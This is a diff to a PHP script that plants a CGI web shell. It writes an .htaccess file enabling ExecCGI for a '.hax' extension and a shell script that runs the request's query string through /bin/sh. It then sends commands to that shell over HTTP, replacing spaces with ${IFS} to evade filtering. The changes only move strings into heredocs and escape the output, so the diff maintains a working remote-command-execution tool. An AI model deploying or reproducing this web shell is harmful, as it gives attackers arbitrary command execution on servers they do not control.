@@ -13,7 +13,10 @@ function create_directory($folder) {
 function create_htaccess($file) {
     echo "Creating htaccess... ";
     $handle = fopen($file, 'w') or die('failed<br />');
-    $data = "Options +ExecCGI\nAddHandler cgi-script .hax";
+    $data = <<<EOT
+Options +ExecCGI
+AddHandler cgi-script .hax
+EOT;
     fwrite($handle, $data);
     fclose($handle);
     echo "done<br />";
@@ -22,7 +25,12 @@ function create_htaccess($file) {
 function create_shell($file) {
     echo "Creating shell... ";
     $handle = fopen($file, 'w') or die('failed<br />');
-    $data = "#!/bin/sh\necho \"Content-type: text/html\"\necho \"\"\n/bin/sh -c \"\$QUERY_STRING 2>&1\"";
+    $data = <<<EOT
+#!/bin/sh
+echo "Content-type: text/html"
+echo ""
+/bin/sh -c "\$QUERY_STRING 2>&1"
+EOT;
     fwrite($handle, $data);
     fclose($handle);
     echo "done<br />";
@@ -71,7 +79,8 @@ function execute_command($shell, $cmd) {
     $shell_url = "http://$_SERVER[HTTP_HOST]$path/$shell";
     $cmd = str_replace(' ', '${IFS}', $cmd);
     $response = file_get_contents($shell_url . '?' . $cmd);
-    echo "Output:<br /><textarea rows=25 cols=80>$response</textarea>";
+    $output = htmlspecialchars($response);
+    echo "Output:<br /><textarea rows=25 cols=80>$output</textarea>";
 }
 
 $htaccess = $dir . '/' . $htaccess;
